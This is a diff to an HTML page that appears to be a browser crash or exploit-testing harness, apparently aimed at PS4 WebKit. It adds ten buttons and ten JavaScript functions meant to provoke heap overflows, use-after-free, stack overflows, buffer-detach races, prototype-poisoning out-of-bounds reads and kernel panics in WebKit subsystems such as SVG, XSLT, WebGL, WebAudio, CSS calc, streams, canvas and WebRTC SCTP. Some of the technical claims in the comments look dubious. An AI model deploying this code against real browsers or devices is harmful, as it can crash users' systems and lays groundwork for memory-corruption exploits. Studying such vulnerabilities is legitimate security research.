@@ -29,6 +29,16 @@
 <button onclick="runXHRReadyStateAbort()">08. XHR Abort during ReadyState Change</button>
 <button onclick="runFontFaceSetIteratorInvalidation()">09. FontFaceSet Iterator Invalidation</button>
 <button onclick="runMessageChannelRecursivePost()">10. MessageChannel Recursive Entanglement</button>
+            <button onclick="crashSVGPathParser()">01. SVG Path Data Huge Float Parser Overflow (Heap Corruption)</button>
+<button onclick="crashXSLTProcessor()">02. XSLT Processor Recursion & Transformation UAF</button>
+<button onclick="crashWebGLBufferSubDataRace()">03. WebGL getBufferSubData Async Pixel Pack Race (GPU Panic)</button>
+<button onclick="crashAudioBiquadFilter()">04. WebAudio BiquadFilter Type Change Race (DSP Kernel Panic)</button>
+<button onclick="crashCSSCalcStack()">05. CSS calc() Deep Nesting Stack Overflow (Style Recalc Crash)</button>
+<button onclick="crashReadableStreamTee()">06. ReadableStream Tee & Cancel Logic Error (Memory Leak/Crash)</button>
+<button onclick="crashTextEncoderSAB()">07. TextEncoder encodeInto SharedArrayBuffer Detach Race</button>
+<button onclick="crashCanvasPutImageData()">08. Canvas putImageData Prototype Poisoning (OOB Read/Write)</button>
+<button onclick="crashImportNodeRecursion()">09. Document.importNode Recursive Mutation Event UAF</button>
+<button onclick="crashSCTPDataChannel()">10. WebRTC DataChannel SCTP Stream ID Overflow (NetBSD Panic)</button>
         </div>
 
         <div class="category">
@@ -601,9 +611,351 @@ function crashRTCGiantSDP() {
         setTimeout(() => pc.close(), 2);
     } catch(e) {}
 }
-     
+
+
+
+function crashSVGPathParser() {
+    // Vector: SVG Path Data Parsing Heap Overflow
+    // Target: WebCore::SVGPathParser
+    const svgNS = "http://www.w3.org/2000/svg";
+    const path = document.createElementNS(svgNS, "path");
+    
+    // Construct a massive, malformed path string to stress the float parser
+    // "M" (MoveTo) followed by millions of coordinates, switching scientific notation
+    let d = "M 0 0";
+    const chunk = " L 1.2345e-10 9.8765e+10 C 1 2 3 4 5 6";
+    
+    // Allocate ~10MB string to overflow internal parser buffer or stack
+    for(let i=0; i<50000; i++) {
+        d += chunk;
+    }
+    
+    // Force immediate parsing and layout calculation
+    path.setAttribute("d", d);
+    document.body.appendChild(path);
+    
+    try {
+        // Force the engine to walk the path segments, triggering the corruption
+        const len = path.getTotalLength();
+        const point = path.getPointAtLength(len / 2);
+        
+        // Mutate during read
+        path.setAttribute("d", "M 0 0"); 
+        
+        // Access potentially freed memory
+        console.log(point.x);
+    } catch(e) {}
+    
+    document.body.removeChild(path);
+}
+
+function crashXSLTProcessor() {
+    // Vector: Libxslt Transformation UAF
+    // Target: WebCore::XSLTProcessor
+    const xmlString = `
+        <root>
+            ${"<item>data</item>".repeat(2000)}
+        </root>`;
+    
+    const xslString = `
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+            <xsl:template match="/">
+                <xsl:for-each select="//item">
+                    <span><xsl:value-of select="."/></span>
+                </xsl:for-each>
+            </xsl:template>
+        </xsl:stylesheet>`;
+
+    const parser = new DOMParser();
+    const xmlDoc = parser.parseFromString(xmlString, "text/xml");
+    const xslDoc = parser.parseFromString(xslString, "text/xml");
+    
+    const processor = new XSLTProcessor();
+    processor.importStylesheet(xslDoc);
+    
+    // Race condition: Modify the source document WHILE transforming
+    const fragment = processor.transformToFragment(xmlDoc, document);
+    
+    // Recursive depth stress
+    function stress() {
+        try {
+            // Re-import and transform in a tight loop to corrupt libxslt state
+            processor.importStylesheet(xslDoc);
+            processor.transformToDocument(xmlDoc);
+            // Intentionally corrupt the XML doc structure
+            xmlDoc.documentElement.appendChild(xmlDoc.createElement("new"));
+        } catch(e) {}
+    }
+    
+    for(let i=0; i<100; i++) stress();
+}
+
+function crashWebGLBufferSubDataRace() {
+    // Vector: GPU Buffer Readback Race
+    // Target: GNM Driver / getBufferSubData
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl2');
+    if(!gl) return;
+    
+    const buffer = gl.createBuffer();
+    gl.bindBuffer(gl.COPY_READ_BUFFER, buffer);
+    gl.bufferData(gl.COPY_READ_BUFFER, 1024 * 1024, gl.DYNAMIC_READ);
+    
+    const readView = new Uint8Array(1024 * 1024);
+    
+    // Create a worker to detach the destination buffer during readback
+    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
+    
+    // This function triggers a DMA transfer from GPU to CPU memory
+    // If the destination memory (readView) is detached during transfer, the DMA writes to void
+    
+    // Schedule detach
+    setTimeout(() => {
+        w.postMessage(readView.buffer, [readView.buffer]);
+    }, 0);
+    
+    // Trigger heavy GPU operation
+    for(let i=0; i<1000; i++) {
+        try {
+            gl.getBufferSubData(gl.COPY_READ_BUFFER, 0, readView);
+            // Write to buffer to ensure page is dirty
+            gl.bufferSubData(gl.COPY_READ_BUFFER, 0, new Uint8Array([1,2,3,4]));
+        } catch(e) {}
+    }
+}
+
+function crashAudioBiquadFilter() {
+    // Vector: Audio DSP Kernel Panic
+    // Target: WebAudio BiquadFilterNode Process
+    if (!window.AudioContext) return;
+    const ctx = new AudioContext();
+    const osc = ctx.createOscillator();
+    const filter = ctx.createBiquadFilter();
+    
+    osc.connect(filter);
+    filter.connect(ctx.destination);
+    osc.start();
+    
+    // Rapidly switch filter types and parameters to confuse the DSP kernel
+    // The filter allocates different internal structures for 'lowpass' vs 'peaking'
+    const types = ["lowpass", "highpass", "bandpass", "lowshelf", "highshelf", "peaking", "notch", "allpass"];
+    
+    const interval = setInterval(() => {
+        try {
+            const t = types[Math.floor(Math.random() * types.length)];
+            filter.type = t;
+            
+            // Set nonsensical values to provoke floating point exceptions or buffer overflows
+            filter.frequency.setValueAtTime(NaN, ctx.currentTime);
+            filter.Q.value = Infinity;
+            filter.gain.value = -3.4028235e38; // Min float
+            
+            // Disconnect and reconnect rapidly
+            filter.disconnect();
+            filter.connect(ctx.destination);
+        } catch(e) {
+            clearInterval(interval);
+            ctx.close();
+        }
+    }, 1);
+    
+    // Run for 2 seconds then stop
+    setTimeout(() => { clearInterval(interval); ctx.close(); }, 2000);
+}
+
+function crashCSSCalcStack() {
+    // Vector: CSS Parser Stack Overflow
+    // Target: WebCore::CSSParser
+    const div = document.createElement('div');
+    document.body.appendChild(div);
+    
+    // Construct a deeply nested calc() expression
+    // calc(1px + calc(1px + calc(...)))
+    let style = "1px";
+    for(let i=0; i<8000; i++) {
+        style = `calc(1px + ${style})`;
+    }
+    
+    // Apply style. This forces the recursive descent parser to go deep.
+    // On systems with limited stack size (like PS4 WebKit), this hits the stack guard page.
+    try {
+        div.style.width = style;
+        
+        // Force style recalculation / Reflow
+        const computed = window.getComputedStyle(div).width;
+        
+        // If we are still alive, try to read it back and mutate
+        div.style.height = style;
+    } catch(e) {}
+    
+    document.body.removeChild(div);
+}
+
+function crashReadableStreamTee() {
+    // Vector: Streams API Logic Error
+    // Target: ReadableStreamTeeEngine
+    let controller;
+    const stream = new ReadableStream({
+        start(c) { controller = c; }
+    });
+    
+    // Tee the stream (branching)
+    const [branch1, branch2] = stream.tee();
+    
+    // Enqueue massive data
+    const chunk = new Uint8Array(1024 * 1024).fill(0x41);
+    
+    // Race: Cancel one branch while reading the other and enqueuing data
+    const reader1 = branch1.getReader();
+    const reader2 = branch2.getReader();
+    
+    // 1. Enqueue data
+    controller.enqueue(chunk);
+    
+    // 2. Read from branch 1
+    reader1.read().then(() => {
+        // 3. Cancel branch 2 inside the resolution of branch 1
+        // This manipulates the internal ref-counts of the source stream chunks
+        branch2.cancel("Crash");
+        
+        // 4. Close source
+        try { controller.close(); } catch(e){}
+        
+        // 5. Try to read from cancelled stream logic
+        reader2.read().catch(()=>{});
+    });
+}
+
+function crashTextEncoderSAB() {
+    // Vector: TextEncoder SAB Detach Race
+    // Target: TextEncoder::encodeInto
+    const encoder = new TextEncoder();
+    const sab = new SharedArrayBuffer(1024 * 1024);
+    const u8 = new Uint8Array(sab);
+    
+    // Huge string to ensure encoding takes measurable CPU time
+    const str = "A".repeat(100000);
+    
+    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
+    
+    // Schedule a transfer (which detaches the buffer on main thread) 
+    // to happen exactly when encodeInto is processing
+    setTimeout(() => {
+        w.postMessage(sab);
+    }, 0);
+    
+    // Loop encoding. If detach happens during the loop C++ logic, 
+    // it writes to unmapped memory.
+    try {
+        for(let i=0; i<1000; i++) {
+            // encodeInto writes directly to the destination buffer
+            encoder.encodeInto(str, u8);
+        }
+    } catch(e) {}
+}
+
+function crashCanvasPutImageData() {
+    // Vector: Canvas OOB via Prototype Poisoning
+    // Target: CanvasRenderingContext2D::putImageData
+    const c = document.createElement('canvas');
+    c.width = 100; c.height = 100;
+    const ctx = c.getContext('2d');
+    
+    // Create ImageData
+    const imgData = ctx.createImageData(100, 100);
+    
+    // Poison the Uint8ClampedArray prototype to intercept data access
+    const proto = Object.getPrototypeOf(imgData.data);
+    
+    // We define a getter for 'length' or specific indices
+    // This confuses the validation logic inside putImageData
+    Object.defineProperty(proto, 'length', {
+        get: () => {
+            // When the engine asks for length, we return a safe value
+            // but internally detach or shrink the buffer
+            return 0; // Return 0 to bypass loops or 0xFFFFFFFF to cause overflow
+        }
+    });
+    
+    try {
+        // The buffer inside imgData is now manipulated
+        // putImageData expects 100*100*4 bytes. If it gets less logic/buffer, it reads OOB.
+        ctx.putImageData(imgData, 0, 0);
+    } catch(e) {}
+    
+    // Restore prototype to avoid breaking the rest of the page immediately
+    delete proto.length;
+}
+
+function crashImportNodeRecursion() {
+    // Vector: ImportNode Recursive UAF
+    // Target: Document::importNode
+    const doc = document.implementation.createHTMLDocument("crash");
+    const div = doc.createElement("div");
+    const child = doc.createElement("span");
+    div.appendChild(child);
+    
+    // Prepare a malicious node that mutates the tree during cloning
+    // importNode performs a deep clone. 
+    // If we can execute JS during the clone (via Custom Elements or Mutation Events), we win.
+    
+    // Note: PS4 WebKit version might support Mutation Events which are deprecated but dangerous
+    child.addEventListener("DOMSubtreeModified", () => {
+        // When the browser clones 'child', this fires.
+        // We destroy the source 'div' or the destination parent.
+        div.innerHTML = "";
+        
+        // Create memory pressure
+        const junk = new Array(1000).fill(1.1);
+    });
+    
+    try {
+        // Deep import. This walks the tree C++ side.
+        // The event handler corrupts the tree structure mid-walk.
+        document.importNode(div, true);
+    } catch(e) {}
+}
+
+function crashSCTPDataChannel() {
+    // Vector: SCTP Stream ID Integer Overflow
+    // Target: WebRTC SCTP / NetBSD Kernel
+    if (!window.RTCPeerConnection) return;
+    
+    const pc = new RTCPeerConnection();
+    
+    // Create thousands of data channels to exhaust Stream IDs (usually 16-bit)
+    // and kernel mbuf clusters allocated for each channel state.
+    const channels = [];
+    
+    try {
+        // Loop until near 65535 limit
+        for(let i=0; i<60000; i++) {
+            // Creating channels is fast, but kernel allocation lags behind
+            channels.push(pc.createDataChannel("chk" + i, {
+                ordered: true,
+                maxRetransmits: 0
+            }));
+            
+            if (i % 1000 === 0) {
+                // Periodically close some to fragment the ID space
+                channels[0].close();
+                channels.shift();
+            }
+        }
+        
+        // Trigger negotiation which pushes this configuration to the kernel
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        
+    } catch(e) {
+        // If JS fails, we might have already corrupted kernel state
+    }
+}
+
+
+        
     </script>
 </body>
 </html>
+
 
 
